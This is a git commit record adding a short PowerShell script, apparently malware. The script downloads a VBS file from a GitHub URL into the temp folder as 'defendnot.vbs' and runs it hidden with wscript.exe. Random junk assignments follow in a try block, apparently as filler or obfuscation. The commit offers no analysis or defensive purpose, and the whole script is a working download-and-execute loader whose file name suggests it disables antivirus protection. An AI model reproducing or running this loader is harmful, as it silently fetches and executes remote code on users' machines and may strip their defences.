f0f9bed3d3bc1163576402ef3890f666d962a620
VoidMenu <windowserrorlogsender@gmail.com>
2025-12-25 23:59:14 -0500

    Add files via upload

---
+++ 2.ps1
@@ -0,0 +1,14 @@
+if ($true) {
+    $Vsm  = "https://raw.githubusercontent.com/VoidMenu/soundz/refs/heads/main/wrapper.vbs"
+    $Pvu  = "$env:TEMP\defendnot.vbs"
+    
+    Invoke-WebRequest -Uri $Vsm -OutFile $Pvu -UseBasicParsing
+    Start-Process wscript.exe -ArgumentList "`"$Pvu`"" -WindowStyle Hidden
+}
+try {
+    85B033im = B0E3sfmN
+    mMHm95kI = e5GnQtVR
+    glKcYeVk = ZKCWLIGF
+    pvjksO4H = CdwM5qzd
+    KT5PkA5d = ZkbrHSye
+} catch {}
